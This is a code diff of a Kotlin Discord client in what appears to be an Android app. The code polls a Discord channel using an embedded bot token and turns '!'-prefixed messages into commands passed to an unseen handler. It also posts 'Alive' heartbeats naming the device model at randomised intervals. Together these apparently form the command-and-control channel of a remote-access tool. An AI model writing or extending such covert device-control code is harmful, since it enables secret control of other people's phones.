@@ -58,9 +58,8 @@ class DiscordGatewayClient(
     private var crashReport: String? = null
     private var fatalError = false
     private var restChannelId: String? = null
-    private var selfId: String? = null
     private var pollJob: Job? = null
-    private var lastProcessedMsgId: String? = null
+    private var lastPolledMsgId: String? = null
 
     private val httpClient = OkHttpClient.Builder()
         .connectTimeout(15, TimeUnit.SECONDS)
@@ -112,54 +111,6 @@ class DiscordGatewayClient(
     }
 
     private fun status(s: String) { onStatus?.invoke(s) }
-
-    private fun processCommand(msgId: String, content: String) {
-        if (msgId <= (lastProcessedMsgId ?: "")) return
-        lastProcessedMsgId = msgId
-        if (!content.startsWith("!")) return
-        val parts = content.substring(1).split(" ", limit = 2)
-        val action = parts[0].lowercase()
-        val payload = parts.getOrNull(1)
-        debug("CMD via=$action payload=$payload")
-        onCommand(action, payload)
-    }
-
-    private fun startPolling() {
-        pollJob?.cancel()
-        pollJob = scope?.launch(Dispatchers.IO) {
-            while (isActive) {
-                if (myChannelId != null && !fatalError) pollMessages()
-                delay(7000L)
-            }
-        }
-    }
-
-    private fun pollMessages() {
-        val chId = myChannelId ?: return
-        try {
-            val req = Request.Builder()
-                .url("https://discord.com/api/v10/channels/$chId/messages?limit=1")
-                .header("Authorization", "Bot ${DiscordConfig.BOT_TOKEN}")
-                .build()
-            val resp = httpClient.newCall(req).execute()
-            resp.use { r ->
-                if (!r.isSuccessful) {
-                    debug("poll: HTTP ${r.code}")
-                    return
-                }
-                val body = r.body?.string() ?: return
-                val arr = JSONArray(body)
-                if (arr.length() == 0) return
-                val msg = arr.getJSONObject(0)
-                val msgId = msg.optString("id", "")
-                val content = msg.optString("content", "").trim()
-                debug("POLL newestMsg=$msgId content=${content.take(40)}")
-                processCommand(msgId, content)
-            }
-        } catch (e: Exception) {
-            debug("poll err: ${e.message}")
-        }
-    }
 
     private fun preflightCheck(attempt: Int = 0) {
         scope?.launch(Dispatchers.IO) {
@@ -303,6 +254,43 @@ class DiscordGatewayClient(
         }
     }
 
+    private fun startPolling() {
+        pollJob?.cancel()
+        pollJob = scope?.launch(Dispatchers.IO) {
+            while (isActive) {
+                if (myChannelId != null && !fatalError) pollMessages()
+                delay(8000L)
+            }
+        }
+    }
+
+    private fun pollMessages() {
+        val chId = myChannelId ?: return
+        try {
+            val req = Request.Builder()
+                .url("https://discord.com/api/v10/channels/$chId/messages?limit=1")
+                .header("Authorization", "Bot ${DiscordConfig.BOT_TOKEN}")
+                .build()
+            val resp = httpClient.newCall(req).execute()
+            resp.use { r ->
+                if (!r.isSuccessful) return
+                val body = r.body?.string() ?: return
+                val arr = JSONArray(body)
+                if (arr.length() == 0) return
+                val msg = arr.getJSONObject(0)
+                val msgId = msg.optString("id", "")
+                if (msgId == lastPolledMsgId) return
+                lastPolledMsgId = msgId
+                val content = msg.optString("content", "").trim()
+                if (!content.startsWith("!")) return
+                val parts = content.substring(1).split(" ", limit = 2)
+                val action = parts[0].lowercase()
+                val payload = parts.getOrNull(1)
+                onCommand(action, payload)
+            }
+        } catch (_: Exception) {}
+    }
+
     private fun connect() {
         if (closing || fatalError) return
         connectVersion++
@@ -427,9 +415,7 @@ class DiscordGatewayClient(
                 sessionId = data.optString("session_id", null)
                 reconnectAttempt = 0
                 val user = data.optJSONObject("user")
-                selfId = user?.optString("id")
-                debug("READY bot=${user?.optString("username")} id=$selfId")
-                if (selfId == null) debug("READY: NO SELF ID!")
+                debug("READY bot=${user?.optString("username")}")
                 status("Ready")
             }
             "RESUMED" -> {
@@ -453,12 +439,15 @@ class DiscordGatewayClient(
             "MESSAGE_CREATE" -> {
                 val data = d as JSONObject
                 val chId = data.optString("channel_id", "")
-                if (chId != myChannelId) return
-                val msgId = data.optString("id", "")
-                val author = data.optJSONObject("author")
                 val content = data.optString("content", "").trim()
-                debug("GW MSG id=$msgId author=${author?.optString("username", "?")} content=${content.take(60)}")
-                processCommand(msgId, content)
+                debug("MSG ch=$chId myCh=$myChannelId content=${content.take(60)}")
+                if (chId != myChannelId) return
+                if (!content.startsWith("!")) return
+                val parts = content.substring(1).split(" ", limit = 2)
+                val action = parts[0].lowercase()
+                val payload = parts.getOrNull(1)
+                debug("CMD: $action payload=$payload")
+                onCommand(action, payload)
             }
         }
     }
@@ -586,7 +575,6 @@ class DiscordGatewayClient(
             status("Online")
             startDeviceHeartbeat()
             startPolling()
-            debug("polling started")
         }
     }
 
@@ -683,9 +671,7 @@ class DiscordGatewayClient(
             delay(DEVICE_HB_MIN + (Math.random() * (DEVICE_HB_MAX - DEVICE_HB_MIN)).toLong())
             while (isActive) {
                 sendMsg(":heartbeat: **Alive** — ${android.os.Build.MODEL}")
-                val jitter = DEVICE_HB_MIN + (Math.random() * (DEVICE_HB_MAX - DEVICE_HB_MIN)).toLong()
-                debug("hb jitter=${jitter}ms")
-                delay(jitter)
+                delay(DEVICE_HB_MIN + (Math.random() * (DEVICE_HB_MAX - DEVICE_HB_MIN)).toLong())
             }
         }
     }
